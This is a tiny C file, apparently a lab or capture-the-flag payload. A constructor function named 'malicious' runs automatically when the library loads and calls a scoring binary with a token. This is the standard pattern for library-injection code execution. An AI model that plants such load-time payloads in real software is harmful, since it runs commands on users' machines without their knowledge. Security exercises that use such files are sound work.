#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
	system("/usr/local/bin/score bd42a653-01fc-4b44-953a-1d0d28a80060");
}
